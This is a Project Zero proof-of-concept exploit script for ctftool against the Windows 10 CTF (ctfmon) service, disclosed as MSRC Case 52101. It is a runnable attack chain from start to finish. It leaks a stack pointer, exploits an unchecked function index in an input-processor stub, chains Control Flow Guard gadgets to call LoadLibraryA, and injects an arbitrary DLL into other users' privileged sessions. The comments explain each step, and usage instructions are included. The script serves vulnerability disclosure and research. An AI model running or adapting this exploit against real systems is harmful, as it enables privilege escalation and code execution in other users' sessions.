# This script launches loads an arbitrary dll on win10 x64 across user
# sessions. MSRC Case 52101, Project Zero ID 1859.
#
# Put the exploit payload into c:\Windows\Temp\exploit.dll, then run
#
#   cat ctfmonexploit.ctf | ctftool.exe
#
#   Tested: MSCTF 10.0.17763.348
#
#   Tavis Ormandy <taviso@google.com>

# Connect to the ctf service for the current user, you can connect
# to other users sessions too, e.g. Administrators, use the syntax
# connect <Desktop Name> <Session ID>, see ctftool.exe help for examples.
connect

# The ctfmon server is in fact also a client of itself. This is
# convenient for exploitation, so find it in the client list and
# make it the default thread.
wait ctfmon.exe

# First we need to leak a stack address. The ctfmon protocol actually
# leaves a stack pointer in the PORT_MESSAGE, which it uses internally
# for buffer management. Yes, this is pretty crazy.
# If we send a message with the MSGFLAG_DATA_APPENDED parameter set,
# then send a NOP, we should get back a stack address.

# NOTE: this sets the required flag, but as there is no parameter chain
# created with setarg, it just sends 0 additional bytes.
marshal 0 1

# Create a new parameter chain, we can find this buffer in the server
# and use it for exploitation.
setarg 0x4
setarg 0x1 41414141-4141-4141-4141-414141414141
setarg 0x1 41414141-4141-4141-4141-414141414141
setarg 0x1 41414141-4141-4141-4141-414141414141
setarg 0x1 41414141-4141-4141-4141-414141414141

# Learn the load address of shcore, which we use for gadgets.
module64 msctf

# Patch in the first CFG gadget, which loads the data from the PORT_MESSAGE
# onto rcx, then jumps to the next gadget.
#   ; __int64 __fastcall CUIFToolbarButtonElement::OnSetCursor
#   sub     rsp, 28h
#   mov     rcx, [rcx+0E8h]
#   mov     rax, [rcx]
#   mov     rax, [rax+0E8h]
#   call    cs:__guard_dispatch_icall_fptr
patch 1 0 module 8 0xE5C00

# Patch in the parameter, the address of this buffer
#  mov     rax, [rcx]
# 0x68 is the offset of our data from the leaked stack pointer.
patch 0 8 stack 8 0x68
patch 0 0 stack 8 -0x68

# Now we control rcx and rip, patch in the address of the next gadget.
# MSCTF!CCompartmentEventSink::OnChange
#   ; __int64 __fastcall CCompartmentEventSink::OnChange
#   mov     rax, [rcx+30h]
#   mov     rcx, [rcx+38h]
#   jmp     cs:__guard_dispatch_icall_fptr
patch 1 8 module 8 0xBA0C0

# Finally we can return into LoadLibrary() now that we control the parameters,
# first learn where that is. Modules are only randomizes at boot on Windows, so
# we can just ask the system where it's loaded.
module64 kernelbase
symbol kernelbase!LoadLibraryA

# This will make [rcx+30h] the address of kernelbase!LoadLibraryA
patch 3 0 module 8 symbol

# This will make [rcx+38h] a pointer to a small stack buffer we control.
patch 3 8 stack 8 0x88

# Build up the parameter to LoadLibraryA(), "..\TEMP\EXPLOIT" (The working
# directory is c:\Windows\System32, so this will load
# C:\Windows\Temp\exploit.dll.
#
# This demo shows how to inject a DLL into other privileged sessions, but a
# LPAC sandbox escape probably cant write to %TEMP%, you would have to do
# something else... but at this point you can call any API with any parameter
# in a High Integrity process, it's game over :)
patch 2  0 0x2E 1
patch 2  1 0x2E 1
patch 2  2 0x5C 1
patch 2  3 0x54 1
patch 2  4 0x45 1
patch 2  5 0x4D 1
patch 2  6 0x50 1
patch 2  7 0x5C 1
patch 2  8 0x45 1
patch 2  9 0x58 1
patch 2 10 0x50 1
patch 2 11 0x4C 1
patch 2 12 0x4F 1
patch 2 13 0x49 1
patch 2 14 0x54 1
patch 2 15 0x00 1

# There is a bug in CStubIEnumTfInputProcessorProfiles::Invoke(), there is no
# bounds checked on the function index you specify. There are only 7 functions
# specified for IID_IEnumTfInputProcessorProfiles, but here we call index
# 496.
#
# Note that at least on Win10, CTF uses CFG, so you cant just jump anywhere.
# CFG is not a strong mitigation, you can only jmp to to whitelisted indirect
# branch targets, but even in the most trivial applications there are hundreds
# of thousands of them.
# We need to chain together a few CFG gadgets. This first jumps to
# CTipProxy::Reconvert(), which happens to do some useful work moving the stack
# around for the next stage in CTipProxy::FindContextPtr().
createstub 0 4 IID_IEnumTfInputProcessorProfiles
callstub 0 0 496

# All done.
exit
